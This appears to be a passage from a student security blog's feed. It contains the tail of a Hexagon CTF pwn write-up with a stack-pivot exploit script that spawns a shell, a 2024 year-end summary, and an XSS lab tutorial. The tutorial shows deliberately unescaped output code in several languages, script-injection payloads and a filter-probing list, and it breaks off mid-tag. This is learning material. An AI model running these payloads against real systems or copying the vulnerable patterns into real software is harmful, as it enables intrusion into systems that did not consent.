class="built_in">p32</span>(fp+<span class="number">8</span>)+<span class="built_in">p32</span>(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line"><span class="built_in">s</span>(payload)</span><br><span class="line"><span class="built_in">irt</span>()</span><br></pre></td></tr></table></figure><h4 id="è§£æ³•2-æ ˆè¿ç§»"><a href="#è§£æ³•2-æ ˆè¿ç§»" class="headerlink" title="è§£æ³•2-æ ˆè¿ç§»"></a>è§£æ³•2-æ ˆè¿ç§»</h4><p>å¯¹1è¡€è„šæœ¬å­¦ä¹ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æœ‰æ„æ€çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexagon-å­¦ä¹ &quot;&gt;&lt;a href=&quot;#Hexagon-å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;Hexagon å­¦ä¹ &quot;&gt;&lt;/a&gt;Hexagon å­¦ä¹ &lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Hexagon&lt;/strong&gt; æ˜¯é«˜é€šï¼ˆQualcommï¼‰</summary>
      
    
    
    
    <category term="hexagon-pwn" scheme="http://s1nec-1o.github.io/categories/hexagon-pwn/"/>
    
    
    <category term="hexagon" scheme="http://s1nec-1o.github.io/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´ç»ˆæ€»ç»“</title>
    <link href="http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-02-01T08:50:35.000Z</published>
    <updated>2025-02-01T09:01:57.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024å¹´ç»ˆæ€»ç»“"><a href="#2024å¹´ç»ˆæ€»ç»“" class="headerlink" title="2024å¹´ç»ˆæ€»ç»“"></a>2024å¹´ç»ˆæ€»ç»“</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡å†™å¹´ç»ˆæ€»ç»“å‘¢ï¼Œä¸€å¹´è¿‡çš„å¥½å¿«ï¼Œå¤§ä¸€å°ç™»-&gt;å¤§äºŒè€ç™»ï¼Œæ„Ÿè§‰ä¸‹åŠå¹´æœ‰ç‚¹æ‘†çƒ‚ï¼ˆï¼Œä¸»è¦è¿˜æ˜¯å¯¹IoTé¢†åŸŸçš„ä¸äº†è§£ï¼Œä»¥åŠè‡ªèº«èƒ½åŠ›çš„ç¼ºé™·ï¼Œå¸Œæœ›æ˜å¹´èƒ½åŠ ä»¥æ”¹è¿›ï¼Œåœ¨æ­¤å†™ä¸‹2024å¹´çš„æ”¶è·ä¸å¯¹2025çš„å¸Œå†€</p><h2 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h2><ol><li>è·å¾—äº†ç¬¬ä¸€æšCVEï¼Œä»0åˆ°1çš„çªç ´ï¼ï¼</li><li>è·å¾—äº†ciscnåä¸œå—åˆ†åŒºçš„äºŒç­‰å¥–</li><li>ç»“è¯†äº†è®¸å¤šä¼™ä¼´</li></ol><p>èƒ½è¯´çš„ä¸Šå·çš„ä¹Ÿå°±è¿™å‡ ä¸ªğŸ¥²ï¼Œä½†æœ€çè´µçš„è¿˜æ˜¯å¿ƒæ€ä¸Šçš„è½¬å˜ä»¥åŠå¯¹è‡ªæˆ‘çš„æ¸…æ™°è®¤çŸ¥</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><ol><li>è·å–å¤§å‚ç±»ä¼¼æ€ç§‘ï¼Œåä¸ºï¼Œåç¡•ç­‰çš„å„ä¸€æšCVE</li><li>è¡¥è¶³Webå®‰å…¨çš„çŸ¥è¯†</li><li>è·å¾—å‡ ä¸ªæ¯”èµ›çš„å¥–é¡¹ï¼ˆPwnï¼ï¼ï¼ï¼‰</li><li>ç¡¬ä»¶å®‰å…¨</li><li>æ— çº¿ç”µå®‰å…¨</li><li>æœ€åï¼Œå¸Œæœ›èƒ½æŒ–åˆ°ä¸€æšæœªæˆæƒRCE</li></ol><p>å¸Œæœ› 2025çš„æˆ‘ ä¸‡äº‹èƒœæ„ï¼å¤©å¤©å¼€å¿ƒï¼åŠªåŠ›å­¦ä¹ ï¼å¤©å¤©å‘ä¸Šï¼å“¦è€¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024å¹´ç»ˆæ€»ç»“&quot;&gt;&lt;a href=&quot;#2024å¹´ç»ˆæ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;2024å¹´ç»ˆæ€»ç»“&quot;&gt;&lt;/a&gt;2024å¹´ç»ˆæ€»ç»“&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="2024å¹´ç»ˆæ€»ç»“" scheme="http://s1nec-1o.github.io/categories/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="å¹´ç»ˆæ€»ç»“" scheme="http://s1nec-1o.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢XSS</title>
    <link href="http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/"/>
    <id>http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/</id>
    <published>2025-01-23T06:06:48.000Z</published>
    <updated>2025-01-23T06:17:01.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSSå­¦ä¹ "><a href="#XSSå­¦ä¹ " class="headerlink" title="XSSå­¦ä¹ "></a>XSSå­¦ä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨IoTè®¾å¤‡ä¸­ï¼Œä¹Ÿæœ‰é‡åˆ°è¿‡XSSçš„æƒ…å†µï¼Œåœ¨æ­¤å­¦ä¹ ing</p><h2 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h2><p>xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯<strong>å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°</strong>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äº§ç”Ÿå±‚é¢"><a href="#äº§ç”Ÿå±‚é¢" class="headerlink" title="äº§ç”Ÿå±‚é¢"></a>äº§ç”Ÿå±‚é¢</h2><p>äº§ç”Ÿå±‚é¢ä¸€èˆ¬éƒ½æ˜¯åœ¨å‰ç«¯ï¼ŒJavaScriptä»£ç èƒ½å¹²ä»€ä¹ˆï¼Œæ‰§è¡Œä¹‹åå°±ä¼šè¾¾åˆ°ç›¸åº”çš„æ•ˆæœ</p><h2 id="å‡½æ•°ç±»"><a href="#å‡½æ•°ç±»" class="headerlink" title="å‡½æ•°ç±»"></a>å‡½æ•°ç±»</h2><p>æ¯”å¦‚è¯´phpä¸­çš„è„šæœ¬çš„è¾“å‡ºå‡½æ•°</p><p>å¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼š<code>print</code>ã€<code>print_r</code>ã€<code>echo</code>ã€<code>printf</code>ã€<code>sprintf</code>ã€<code>die</code>ã€<code>var_dump</code>ã€<code>var_export</code></p><p>å…¶å®<strong>å½’æ ¹ç»“åº•</strong>ï¼ŒXSSçš„æ”»å‡»æ–¹å¼å°±æ˜¯æƒ³åŠæ³•â€œæ•™å”†â€ç”¨æˆ·çš„æµè§ˆå™¨å»æ‰§è¡Œä¸€äº›è¿™ä¸ªç½‘é¡µä¸­åŸæœ¬ä¸å­˜åœ¨çš„<strong>å‰ç«¯ä»£ç </strong>ã€‚</p><h2 id="ä»€ä¹ˆå¯¼è‡´xss"><a href="#ä»€ä¹ˆå¯¼è‡´xss" class="headerlink" title="ä»€ä¹ˆå¯¼è‡´xss"></a>ä»€ä¹ˆå¯¼è‡´xss</h2><p><strong>è¾“å…¥éªŒè¯å’Œæ¸…ç†ä¸è¶³</strong></p><p>Web åº”ç”¨ç¨‹åºæ¥å—ç”¨æˆ·æ•°æ®ï¼ˆä¾‹å¦‚é€šè¿‡è¡¨å•ï¼‰ï¼Œå¹¶ä½¿ç”¨è¿™äº›æ•°æ®åŠ¨æ€ç”Ÿæˆ HTML é¡µé¢ã€‚å› æ­¤ï¼Œæ¶æ„è„šæœ¬å¯ä»¥ä½œä¸ºåˆæ³•è¾“å…¥çš„ä¸€éƒ¨åˆ†åµŒå…¥ï¼Œå¹¶æœ€ç»ˆç”±æµè§ˆå™¨æ‰§è¡Œï¼Œé™¤éç»è¿‡å……åˆ†æ¸…ç†ã€‚</p><p><strong>ç¼ºä¹è¾“å‡ºç¼–ç </strong></p><p>ç”¨æˆ·å¯ä»¥ä½¿ç”¨å„ç§å­—ç¬¦æ¥æ”¹å˜ Web æµè§ˆå™¨å¤„ç†å’Œæ˜¾ç¤ºç½‘é¡µçš„æ–¹å¼ã€‚å¯¹äº HTML éƒ¨åˆ†ï¼Œå°†<code>&lt;</code>ã€<code>&gt;</code>ã€<code>&quot;</code>ã€<code>&#39;</code>å’Œ<code>&amp;</code>ç­‰å­—ç¬¦æ­£ç¡®ç¼–ç ä¸ºå„è‡ªçš„ HTML ç¼–ç è‡³å…³é‡è¦ã€‚å¯¹äº JavaScriptï¼Œåº”ç‰¹åˆ«æ³¨æ„è½¬ä¹‰<code>&#39;</code>ã€<code>&quot;</code>å’Œ<code>\</code>ã€‚<strong>æ— æ³•æ­£ç¡®ç¼–ç ç”¨æˆ·æä¾›çš„æ•°æ®</strong>æ˜¯å¯¼è‡´XSSæ¼æ´çš„ä¸»è¦åŸå› ã€‚</p><p><strong>å®‰å…¨æ ‡å¤´ä½¿ç”¨ä¸å½“</strong></p><p>å„ç§å®‰å…¨æ ‡å¤´éƒ½å¯ä»¥å¸®åŠ©ç¼“è§£XSSæ¼æ´ã€‚ä¾‹å¦‚ï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ ( CSP )é€šè¿‡å®šä¹‰å“ªäº›æ¥æºå¯ä¿¡ä»»å¯æ‰§è¡Œè„šæœ¬æ¥ç¼“è§£XSSé£é™©ã€‚é…ç½®é”™è¯¯çš„CSPï¼ˆä¾‹å¦‚è¿‡äºå®½æ¾çš„ç­–ç•¥æˆ–ä¸å½“ä½¿ç”¨<code>unsafe-inline</code>æˆ–<code>unsafe-eval</code>æŒ‡ä»¤ï¼‰å¯èƒ½ä¼šè®©æ”»å‡»è€…æ›´å®¹æ˜“æ‰§è¡Œå…¶XSSè´Ÿè½½ã€‚</p><p><strong>æ¡†æ¶å’Œè¯­è¨€æ¼æ´</strong></p><p>ä¸€äº›è¾ƒ<strong>æ—§çš„ Web æ¡†æ¶</strong>æœªæä¾›é’ˆå¯¹XSSçš„å®‰å…¨æœºåˆ¶ï¼›å…¶ä»–ä¸€äº›æ¡†æ¶å­˜åœ¨æœªä¿®è¡¥çš„XSSæ¼æ´ã€‚ç°ä»£ Web æ¡†æ¶åœ¨è®¾è®¡ä¸Šä¼šè‡ªåŠ¨é¿å¼€XSSï¼Œå¹¶åŠæ—¶ä¿®è¡¥ä»»ä½•å‘ç°çš„æ¼æ´ã€‚</p><p><strong>ç¬¬ä¸‰æ–¹åº“</strong></p><p>åœ¨ Web åº”ç”¨ç¨‹åºä¸­é›†æˆç¬¬ä¸‰æ–¹åº“å¯èƒ½ä¼šå¼•å…¥XSSæ¼æ´ï¼›å³ä½¿æ ¸å¿ƒ Web åº”ç”¨ç¨‹åºä¸æ˜“å—åˆ°æ”»å‡»ã€‚</p><h2 id="Bug-code"><a href="#Bug-code" class="headerlink" title="Bug code"></a>Bug code</h2><p>ä¸€ä¸ªç®€å•çš„åå°„å‹XSSæ¼æ´æ˜¯å½“<strong>ç”¨æˆ·æœç´¢æŸä¸ªæœ¯è¯­</strong>æ—¶ï¼Œ<strong>æœç´¢å­—ç¬¦ä¸²ä¼šé€å­—åŒ…å«åœ¨ç»“æœé¡µé¢ä¸­</strong>ã€‚è¿™ç§ç®€å•çš„æƒ…å†µä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªå®¹æ˜“åˆ©ç”¨çš„ç›®æ ‡ã€‚</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$search_query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You searched for: <span class="subst">$search_query</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> searchTerm = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;You searched for: &#x27;</span> + searchTerm);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h3 id="Pythonï¼ˆFlaskï¼‰"><a href="#Pythonï¼ˆFlaskï¼‰" class="headerlink" title="Pythonï¼ˆFlaskï¼‰"></a>Pythonï¼ˆFlaskï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;You searched for: <span class="subst">&#123;query&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> userInput = Request.QueryString[<span class="string">&quot;q&quot;</span>];</span><br><span class="line">    Response.Write(<span class="string">&quot;User Input: &quot;</span> + userInput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ç›´æ¥è¾“å…¥<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>å°±å¯ä»¥å‘ç°æ²¡è¢«è¿‡æ»¤ç›´æ¥æˆåŠŸ</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ç…§å¸¸è¾“å…¥<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>F12å‘ç°è¢«è½¬ä¹‰æˆ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>);&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¾€ä¸‹çœ‹ä¼šå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>åœ¨valueä¸­æ²¡è¢«è½¬ä¹‰ï¼Œå› æ­¤å¯ä»¥æ„é€ </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;script&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/script&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å³è¾“å…¥ <code>?name=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;&quot;</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>è¿™ä¸€é¢˜æ¶‰åŠä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p>åœ¨ 8.1.0 åŠä»¥ä¸Šçš„ PHP ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤ä¼šè½¬ä¹‰ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>&#39;</code>ã€<code>&quot;</code> è¿™äº”ä¸ªå­—ç¬¦ï¼ŒåŸºæœ¬å¯ä»¥é˜²èŒƒè¿™é‡Œçš„ XSS æ”»å‡»ã€‚<br>ä½†æ˜¯ï¼Œ8.1.0 ä»¥ä¸‹ç‰ˆæœ¬çš„ PHP é»˜è®¤åªä¼šè½¬ä¹‰ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>&quot;</code> è¿™å››ä¸ªå­—ç¬¦ï¼Œä¸ä¼šè½¬ä¹‰å•å¼•å· <code>&#39;</code>ã€‚è¿™å°±ç»™è¿™ä¸ªå‡½æ•°å¸¦æ¥äº†å·¨å¤§çš„å®‰å…¨éšæ‚£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¢æµ‹è¯­å¥æ¥çœ‹åˆ°è¿™ä¸€ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br><span class="line">&lt; &gt;</span><br><span class="line">&lt;script&gt; &lt;/script&gt;</span><br><span class="line">&lt;Script&gt; &lt;/Script&gt;</span><br><span class="line">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;</span><br><span class="line">Onerror</span><br><span class="line">onerror</span><br><span class="line">javascript:</span><br><span class="line">JavaScript:</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line">eval()</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">src</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>æ‰“è¿›å»çœ‹è§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;   //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&quot;   //è½¬è¯‘æˆ&amp;quot;</span></span><br><span class="line"><span class="string">()  //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt; &gt; //&amp;lt; &amp;gt;</span></span><br><span class="line"><span class="string">&lt;script&gt; &lt;/script&gt; //&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;Script&gt; &lt;/Script&gt; //&amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; //&amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt;</span></span><br><span class="line"><span class="string">Onerror //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">onerror //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">javascript: //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">JavaScript: //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt;!-- --&gt; //&amp;lt;!-- --&amp;gt;</span></span><br><span class="line"><span class="string">eval() //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&lt;a&gt; //&amp;lt;a&amp;gt;</span></span><br><span class="line"><span class="string">&lt;img&gt; //&amp;lt;img&amp;gt;</span></span><br><span class="line"><span class="string">&lt;iframe&gt; //&amp;lt;ifname&amp;gt;</span></span><br><span class="line"><span class="string">&lt;form&gt; //&amp;lt;form&amp;gt;</span></span><br><span class="line"><span class="string">src //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">&#123;&#125; //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">/ //æœªè¢«è½¬ä¹‰</span></span><br><span class="line"><span class="string">+ //æœªè¢«è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¢«è¿‡æ»¤å•å¼•å·ï¼Œç„¶åå‘ç°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span 